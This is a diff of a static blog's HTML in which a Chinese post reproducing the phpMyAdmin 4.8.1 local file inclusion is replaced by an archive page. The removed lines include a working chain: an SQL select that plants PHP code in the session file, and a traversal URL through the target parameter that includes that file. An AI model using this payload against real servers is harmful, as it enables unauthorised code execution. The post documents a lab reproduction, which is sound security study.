@@ -6,23 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://shh4757.github.io">
-  <title>phpMyAdmin4.8.x漏洞复现 | sleepyde1b</title>
+  <title>Archives: 2019/8 | sleepyde1b</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
-<meta property="og:type" content="article">
-<meta property="og:title" content="phpMyAdmin4.8.x漏洞复现">
-<meta property="og:url" content="http://shh4757.github.io/2019/07/28/shh/index.html">
+  <meta name="description" content="记录学习">
+<meta property="og:type" content="website">
+<meta property="og:title" content="sleepyde1b">
+<meta property="og:url" content="http://shh4757.github.io/archives/2019/08/index.html">
 <meta property="og:site_name" content="sleepyde1b">
-<meta property="og:description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
+<meta property="og:description" content="记录学习">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e19Dw8.md.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e1ER4f.md.png">
-<meta property="og:updated_time" content="2019-07-28T13:23:44.240Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="phpMyAdmin4.8.x漏洞复现">
-<meta name="twitter:description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png">
+<meta name="twitter:title" content="sleepyde1b">
+<meta name="twitter:description" content="记录学习">
   
     <link rel="alternative" href="/atom.xml" title="sleepyde1b" type="application/atom+xml">
   
@@ -140,162 +135,49 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-shh" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      phpMyAdmin4.8.x漏洞复现
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/08/01/html/" class="archive-article-date">
+  	<time datetime="2019-08-01T05:50:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-01</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/08/01/html/">html+javascript+jquery+ajax</a>
     </h1>
   
 
-        
-        <a href="/2019/07/28/shh/" class="archive-article-date">
-  	<time datetime="2019-07-28T08:45:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：</p>
-<a id="more"></a>
+        <div class="article-info info-on-right">
+          
+          
 
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a>。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p>
-<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>​       攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确测试。</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
-<li><p>在LAMP环境下进入下载好的phpmyadmin4.8.1并登录，找到SQL栏，执行SQL查询</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select &apos;&lt;?php phpinfo();exit;?&gt;&apos;`</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p><a href="https://imgchr.com/i/e1pNrV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png" alt="e1pNrV.md.png"></a></p>
-<p>  2.进入开发者工具在Cookie中的phpmyadmin中获取自己的session id</p>
-<p><a href="https://imgchr.com/i/e19Dw8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e19Dw8.md.png" alt="e19Dw8.md.png"></a></p>
-<p>   这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p>
-<p>3.包含session文件，漏洞利用成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.222/phpmyadmin/server_sql.php?target=index.php%253f/../../../../../../../../var/lib/php/session/sess_39paiubi5fdps7321f91oadsv525usle</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://imgchr.com/i/e1ER4f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e1ER4f.md.png" alt="e1ER4f.md.png"></a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://shh4757.github.io/2019/07/28/shh/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2019/07/29/dvwa/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          DVWA安装过程
-        
-      </div>
-    </a>
   
   
-    <a href="/2019/07/28/test/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Maps</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -318,8 +200,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
